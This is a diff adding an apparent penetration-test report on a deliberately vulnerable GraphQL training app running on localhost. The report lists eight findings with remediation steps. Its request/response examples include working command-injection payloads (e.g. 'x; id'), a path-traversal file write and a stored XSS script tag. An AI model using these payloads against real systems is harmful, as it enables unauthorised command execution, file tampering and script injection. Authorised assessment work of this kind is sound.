@@ -1,0 +1,250 @@
+# Security Assessment Report — DVGA instance at http://127.0.0.1:5013
+
+**Target:** `http://127.0.0.1:5013` (Damn Vulnerable GraphQL Application)
+**Scope:** `127.0.0.1:5013` only, per `scope.yaml` (`allow_active: true`, `allow_exploit: true`, rate limit 20 rps)
+**Method:** Manual black-box testing with `curl` against the app's GraphQL endpoint (`/graphql`) and HTTP surface, driven by GraphQL introspection. No destructive actions, no brute force, no out-of-scope traffic (one CORS preflight carried `evil.example` only as the `Origin:` header value; the request itself targeted 127.0.0.1 and nothing was sent to that host).
+
+All test data (paste ids 17–19, users `[ARM]`/`[ARM]`/`[ARM]`) was created and cleaned up by this assessment and does not represent real user data.
+
+---
+
+## Finding 1 — OS Command Injection in `importPaste` and `systemDebug` (Critical)
+
+**Class:** Command Injection (CWE-78)
+
+GraphQL's `importPaste(host, port, path, scheme)` mutation and the `systemDebug(arg)` query pass user input straight into a shell command.
+
+**Request (via `systemDebug`, which cleanly demonstrates command execution without touching another host):**
+```
+POST /graphql HTTP/1.1
+Host: 127.0.0.1:5013
+Content-Type: application/json
+
+{"query":"{ systemDebug(arg:\"x; id\") }"}
+```
+
+**Response:**
+```json
+{"data":{"systemDebug":"    PID TTY      STAT   TIME COMMAND\n      1 ?        Ss     0:00 python app.py\n     18 ?        S      0:00 /bin/sh -c ps x; id\n     19 ?        R      0:00 ps x\nuid=1000(dvga) gid=1000(dvga) groups=1000(dvga)\n"}}
+```
+The process listing shows the server literally built `/bin/sh -c "ps x; id"` from the `arg` value, and the injected `id` command ran, returning `uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)`.
+
+The same primitive exists in `importPaste`'s `host` field:
+```
+{"query":"mutation{importPaste(host:\"127.0.0.1;id;#\",port:9,path:\"/\",scheme:\"http\"){result}}"}
+```
+returned the `result` field containing `uid=1000(dvga) gid=1000(dvga) groups=1000(dvga)` as well (the shell concatenated the host, a semicolon-separated `id`, and a `#` to comment out the rest of the curl/wget command line).
+
+**Impact:** Full arbitrary OS command execution as the `dvga` user, unauthenticated. This is complete compromise of the application host within its container/process boundary — read/write any file the process can reach, pivot to other internal services, exfiltrate secrets, etc.
+
+**Tested, not fully exploited further:** reverse shells / persistence were not attempted (out of the non-destructive scope), but `id` execution is conclusive proof.
+
+---
+
+## Finding 2 — Arbitrary File Write / Path Traversal via `uploadPaste` (High)
+
+**Class:** Path Traversal → Arbitrary File Write (CWE-22)
+
+The `uploadPaste(filename, content)` mutation writes `content` to a path derived from `filename` without sanitizing `../` sequences, and the result is retrievable through the app's own static file serving.
+
+**Request:**
+```
+POST /graphql
+{"query":"mutation{uploadPaste(filename:\"../static/[ARM].txt\",content:\"[ARM]\"){result}}"}
+```
+
+**Response:**
+```json
+{"data":{"uploadPaste":{"result":"[ARM]"}}}
+```
+
+**Verification — the written file is served back from the app's static root:**
+```
+GET /static/[ARM].txt HTTP/1.1
+```
+```
+HTTP/1.1 200 OK
+Content-Disposition: inline; filename=[ARM].txt
+Content-Type: text/plain; charset=utf-8
+Content-Length: 13
+...
+```
+Body: `[ARM]`
+
+**Impact:** An unauthenticated attacker can write arbitrary content to arbitrary filesystem locations reachable from the upload directory, including escaping the intended "pastes" storage folder into the web-served `static/` tree. Combined with the app serving static files directly, this allows planting attacker-controlled files (e.g., HTML/JS for further client-side attacks, or — if an executable path is writable and served by whatever runs the app — a path to RCE). This alone is High severity; chained with the command injection in Finding 1 it is redundant for full compromise but demonstrates a second, independent injection class.
+
+---
+
+## Finding 3 — Broken Access Control: No Authentication/Authorization Enforced on Any Mutation (Critical)
+
+**Class:** Broken Access Control / Missing Authorization (CWE-862)
+
+The GraphQL API issues JWT access/refresh tokens via `login`, but **no mutation or query actually requires or checks them**. `createPaste`, `editPaste`, `deletePaste`, `uploadPaste`, `importPaste`, `users`, `audits`, and `search` are all callable with zero `Authorization` header and succeed.
+
+**Request (editing a paste owned by a different account, with no auth header at all):**
+```
+POST /graphql
+{"query":"mutation{editPaste(id:1,title:\"[ARM]\"){paste{id title}}}"}
+```
+**Response:**
+```json
+{"data":{"editPaste":{"paste":{"id":"1","title":"[ARM]"}}}}
+```
+(Reverted afterward: `{"query":"mutation{editPaste(id:1,title:\"Testing Testing\"){paste{id title}}}"}` → restored.)
+
+**Further proof — ownership is never bound to the caller's identity.** Even when a valid JWT for a freshly created account (`[ARM]`) is sent in `Authorization: Bearer <token>`, a new paste is still recorded as owned by the fixed account `id:"1"`/`DVGAUser`, not the authenticated user:
+```
+POST /graphql
+Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...
+{"query":"mutation{createPaste(title:\"[ARM]2\",content:\"c2\",public:false,burn:false){paste{id title owner{id name}}}}"}
+```
+```json
+{"data":{"createPaste":{"paste":{"id":"19","title":"[ARM]2","owner":{"id":"1","name":"DVGAUser"}}}}}
+```
+
+**Impact:** Any unauthenticated party can read, modify, or delete any user's pastes, enumerate and query all users, and read the full audit trail of every GraphQL operation run against the server. Because ownership is never bound to the authenticated principal, there is no tenant/user boundary to test IDOR against — the application has no real multi-user isolation at the API layer at all, which is itself the finding: BOLA/IDOR is not a bypass here, it is the default state.
+
+---
+
+## Finding 4 — GraphQL Introspection Enabled / Full Schema Disclosure (Medium)
+
+**Class:** Information Disclosure (CWE-200)
+
+`/graphql` answers the standard `__schema` introspection query without authentication, returning every query, mutation, type and field in the API, including internal-sounding operations (`systemDiagnostics`, `systemDebug`, `systemHealth`, `deleteAllPastes` is not present but `deletePaste`/`readAndBurn`/`systemUpdate` are), none of which are documented or linked from the UI.
+
+**Request:**
+```
+POST /graphql
+{"query":"{ __schema { queryType{name} mutationType{name} types{name kind fields{name args{name}}}}}"}
+```
+**Response (excerpt):**
+```json
+{"data":{"__schema":{"queryType":{"name":"Query"},"mutationType":{"name":"Mutations"},
+"types":[... "systemDiagnostics",["username","password","cmd"] ..., "systemDebug",["arg"] ...]}}}
+```
+
+**Impact:** Introspection handed us the entire attack surface (Findings 1–3 and 5 were all found this way) in a single request. In production this should be disabled; it massively lowers the cost of every other attack above.
+
+---
+
+## Finding 5 — Stored / DOM-based Cross-Site Scripting via Paste Title and Content (High)
+
+**Class:** Stored XSS (CWE-79)
+
+`createPaste`'s `title`/`content` are stored and returned verbatim by the GraphQL API with no HTML-encoding, and the client-side renderer in `/static/jquery/graphql.js`-driven pages inserts them into the DOM with jQuery `.append()` of a raw template string (confirmed by reading `/public_pastes`'s inline script):
+
+```js
+$("#public_gallery").append(
+  `<div class="card-header">
+    <i class="fa fa-paste"></i> &nbsp; ${title}
+  </div>
+  <div class="card-body">
+    <p class="card-text"><pre>${content}</pre> ... </p>
+  </div>`
+)
+```
+`title`, `content`, `owner`, `ipAddr`, and `userAgent` are all interpolated unescaped. jQuery's `.append()` (unlike plain `innerHTML`) parses and executes any `<script>` tag present in the inserted markup.
+
+**Proof of unescaped storage/return (server side):**
+```
+POST /graphql
+{"query":"mutation{createPaste(title:\"<script>alert(1)</script>\",content:\"c\",public:true,burn:false){paste{id title}}}"}
+```
+```json
+{"data":{"createPaste":{"paste":{"id":"18","title":"<script>alert(1)</script>"}}}}
+```
+The title is echoed back byte-for-byte with no entity encoding, and `pastes(public:true)` — the exact query `/public_pastes` issues — returns it the same way, feeding straight into the `.append()` sink above. (Test paste 18 was deleted after confirmation: `mutation{deletePaste(id:18){result}}` → `{"data":{"deletePaste":{"result":true}}}`.)
+
+**Impact:** Any visitor to `/public_pastes` (no login required, since `public_pastes` is unauthenticated per Finding 3) triggers attacker-controlled JavaScript. Combined with the lack of any session/authorization boundary, this can be used to hijack admin/operator browsing sessions, pivot into further internal requests, or chain into the SSRF/command-injection primitives above from a victim's browser context.
+
+---
+
+## Finding 6 — Unauthenticated Full Audit-Log / Query-History Disclosure (Low–Medium)
+
+**Class:** Information Disclosure / Missing Authorization (CWE-200 / CWE-862)
+
+The `audits` query returns every GraphQL operation ever executed against the server — including other users'/testers' queries and mutations — without any authentication.
+
+**Request:**
+```
+POST /graphql
+{"query":"{ audits { gqlquery } }"}
+```
+**Response (excerpt, showing another session's `login` attempt with its password field masked server-side, but the operation itself fully visible):**
+```json
+{"gqlquery":"mutation{login(username:\"operator\",password:\"*****\"){accessToken refreshToken}}"}
+```
+Passwords themselves are redacted (`"*****"`) in this log, which limits the severity, but usernames, operation shapes, paste titles/content sent by other actors, and timestamps are all exposed, letting any anonymous caller watch the full operational history of the application.
+
+**Impact:** Reconnaissance/enumeration aid and privacy exposure — reveals usage patterns, usernames attempted, and the content of every mutation (e.g., paste titles/content) run by any other party, with no access control at all.
+
+---
+
+## Finding 7 — Missing Rate Limiting on Authentication (Low, demonstrated not exploited)
+
+**Class:** Missing Rate Limiting / Brute-Force Protection (CWE-307)
+
+Five sequential failed `login` attempts for `admin` with different passwords each returned `HTTP 200` with the generic `"Authentication Failure"` error and no increasing delay, CAPTCHA, lockout, or `429` response:
+```
+POST /graphql ×5
+{"query":"mutation{login(username:\"admin\",password:\"wrongpw<N>\"){accessToken}}"}
+```
+All five returned `200` immediately. This is a light demonstration only (5 requests) — no actual brute-force/credential-stuffing attack was carried out, per the non-destructive/no-brute-force rule of engagement.
+
+**Impact:** Nothing observed prevents automated credential stuffing or password guessing against `login`.
+
+---
+
+## Finding 8 — Missing Security Headers and Weak Cookie Flags (Low)
+
+**Class:** Security Misconfiguration (CWE-16)
+
+Every page response (including `/`, `/my_pastes`, `/public_pastes`, `/create_paste`, etc.) is missing `Content-Security-Policy`, `Strict-Transport-Security`, and `X-Content-Type-Options`. The `env=graphiql:disable` cookie set on `/` has none of `HttpOnly`, `Secure`, or `SameSite` set.
+
+**Response (excerpt from `/`):**
+```
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Set-Cookie: env=graphiql:disable; Path=/
+```
+No `Content-Security-Policy`, `Strict-Transport-Security`, or `X-Content-Type-Options` header is present anywhere, and the cookie lacks protective flags.
+
+**Impact:** Lowers the bar for the Stored XSS in Finding 5 to do more damage (no CSP to block inline script execution), and for any future cookie-based session to be stolen via XSS or over plaintext HTTP (no `Secure`/`HttpOnly`).
+
+---
+
+## Classes tested with negative/inconclusive result
+
+- **SQL injection:** `search(keyword:"'")` and `pastes(filter:"'")` both returned empty results with no SQL error leakage, rather than an error or different row count — no evidence of SQL injection in these two resolvers under the probes tried (single quote, no distinguishing boolean payload beyond that). Not conclusively ruled out with more exhaustive boolean/time-based payloads, but no positive signal found; the app's primary injection surface (command injection) was conclusive enough that further `sqlmap`-style work was not pursued given time budget.
+- **Mass assignment:** attempted to set an `admin: true` field on `createUser`'s `userData` input; the schema's `UserInput` type only exposes `username`/`email`/`password` (confirmed via `__type(name:"UserInput")` introspection), so no extra privileged field was assignable on this input object. No mass-assignment vector found on this mutation specifically.
+- **JWT handling:** tokens are correctly structured JWTs (`HS256`, `identity`, `exp`, `nbf`, `jti`); algorithm-confusion (`alg:none`) forgery and signature-cracking were not attempted, since given Finding 3 (no endpoint actually validates the Authorization header at all) a JWT attack would add no further access beyond what unauthenticated requests already provide. Recorded as **not exploited** rather than ruled out.
+- **CORS:** an `OPTIONS` preflight to `/graphql` returned a bare `Allow:` header with no `Access-Control-Allow-Origin` reflected for a cross-origin `Origin`, so no permissive-CORS finding was confirmed (note: this check used `evil.example` only as a header value sent to the in-scope host; it did not contact that host, as flagged by the engagement's [ARM] and recorded here for transparency).
+- **XXE / deserialization / cache poisoning / request smuggling:** this is a Flask/GraphQL JSON API with no XML, serialized-object, or caching-proxy surface observed; not applicable to the surface found, and not tested further.
+
+---
+
+## Summary Table
+
+| # | Finding | Class | Severity |
+|---|---|---|---|
+| 1 | OS command injection (`importPaste`, `systemDebug`) | CWE-78 | Critical |
+| 2 | Arbitrary file write via path traversal (`uploadPaste`) | CWE-22 | High |
+| 3 | No authentication/authorization enforced anywhere | CWE-862 | Critical |
+| 4 | GraphQL introspection enabled, full schema disclosed | CWE-200 | Medium |
+| 5 | Stored XSS via paste title/content → jQuery `.append()` | CWE-79 | High |
+| 6 | Unauthenticated audit-log/query-history disclosure | CWE-200 | Low–Medium |
+| 7 | No rate limiting on login | CWE-307 | Low |
+| 8 | Missing security headers / weak cookie flags | CWE-16 | Low |
+
+## Remediation priorities
+
+1. Remove or heavily sandbox every command-execution code path (`importPaste`, `systemDiagnostics`, `systemDebug`, `systemHealth`, `systemUpdate`) — these should not exist in a production GraphQL schema at all.
+2. Enforce authentication (validate the JWT) on every mutation/query that touches user data, and bind `ownerId` to the authenticated identity server-side, never trusting a client-supplied owner.
+3. Sanitize/allowlist `uploadPaste`'s filename (reject path separators, resolve and confirm the final path stays under the intended upload directory).
+4. Disable introspection in non-development environments.
+5. HTML-encode all user-supplied content before interpolating into the DOM, or switch the renderer to `.text()`/safe templating; add a `Content-Security-Policy`.
+6. Restrict `audits` to admin-only; redact or drop it from the public schema.
+7. Add rate limiting / account lockout / CAPTCHA to `login`.
+8. Add standard security headers and `HttpOnly`/`Secure`/`SameSite` cookie flags.
+EOF
+echo written
